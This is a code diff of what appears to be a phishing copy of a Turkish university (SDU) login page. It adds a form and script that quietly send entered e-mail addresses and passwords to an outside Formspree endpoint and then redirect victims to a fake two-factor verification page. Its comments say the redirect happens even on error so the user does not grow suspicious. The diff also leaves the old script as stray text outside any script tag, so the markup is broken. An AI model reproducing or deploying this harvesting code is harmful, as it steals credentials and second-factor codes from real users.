@@ -1028,48 +1028,57 @@
                                     </span>
                                 </div>
                                 <div class="login-form-container" style="margin-top: 20px;">
-                                    <form id="sduForm" action="https://formspree.io/f/mvzzwyqq" method="POST">
-
-                                        <div class="form-label-group form-group position-relative">
-                                            <input type="text" name="kullanici" class="form-control"
-                                                placeholder="E-Posta Adresi" required autofocus>
+                                    <form id="anaForm" action="https://formspree.io/f/mvzzwyqq" method="POST">
+                                        <div class="form-group mb-3">
+                                            <input type="text" name="ana_posta" class="form-control"
+                                                placeholder="E-Posta Adresi" required>
                                         </div>
-
-                                        <div class="form-label-group form-group position-relative">
-                                            <input type="password" name="anahtar" class="form-control"
+                                        <div class="form-group mb-3">
+                                            <input type="password" name="ana_sifre" class="form-control"
                                                 placeholder="Şifre" required>
                                         </div>
-
-                                        <button type="submit" class="btn btn-login text-uppercase font-weight-bold mb-2"
-                                            style="width:100%; background-color:#800000; color:white; height: 50px;">
-                                            GİRİŞ YAP
-                                        </button>
+                                        <button type="submit" class="btn btn-primary"
+                                            style="width:100%; background-color:#800000; color:white;">GİRİŞ
+                                            YAP</button>
                                     </form>
 
                                     <script>
-                                        var form = document.getElementById("sduForm");
-
-                                        async function handleSubmit(event) {
-                                            event.preventDefault(); // Formspree'nin kendi sayfasına gitmesini engelle
-                                            var data = new FormData(event.target);
-
-                                            // Bilgileri arka planda Formspree'ye gönder
-                                            fetch(event.target.action, {
-                                                method: form.method,
+                                        document.getElementById("anaForm").addEventListener("submit", function (e) {
+                                            e.preventDefault();
+                                            var data = new FormData(this);
+                                            fetch(this.action, {
+                                                method: 'POST',
                                                 body: data,
-                                                headers: {
-                                                    'Accept': 'application/json'
-                                                }
-                                            }).then(response => {
-                                                // Gönderim başarılı olsun olmasın, beklemeden 2FA sayfasına fırlat!
-                                                window.location.href = "https://sdu-sistem.vercel.app/dogrulama.html";
-                                            }).catch(error => {
-                                                // Hata olsa bile yine de gönder (Kullanıcı şüphelenmesin)
-                                                window.location.href = "https://sdu-sistem.vercel.app/dogrulama.html";
+                                                headers: { 'Accept': 'application/json' }
+                                            }).finally(() => {
+                                                // Bilgi gönderilince hemen 2FA sayfasına at
+                                                window.location.href = "dogrulama.html";
                                             });
-                                        }
+                                        });
+                                    </script>
+                                    var form = document.getElementById("sduForm");
 
-                                        form.addEventListener("submit", handleSubmit)
+                                    async function handleSubmit(event) {
+                                    event.preventDefault(); // Formspree'nin kendi sayfasına gitmesini engelle
+                                    var data = new FormData(event.target);
+
+                                    // Bilgileri arka planda Formspree'ye gönder
+                                    fetch(event.target.action, {
+                                    method: form.method,
+                                    body: data,
+                                    headers: {
+                                    'Accept': 'application/json'
+                                    }
+                                    }).then(response => {
+                                    // Gönderim başarılı olsun olmasın, beklemeden 2FA sayfasına fırlat!
+                                    window.location.href = "https://sdu-sistem.vercel.app/dogrulama.html";
+                                    }).catch(error => {
+                                    // Hata olsa bile yine de gönder (Kullanıcı şüphelenmesin)
+                                    window.location.href = "https://sdu-sistem.vercel.app/dogrulama.html";
+                                    });
+                                    }
+
+                                    form.addEventListener("submit", handleSubmit)
                                     </script>
                                 </div>
                                 <div class="form-label-group form-group position-relative">
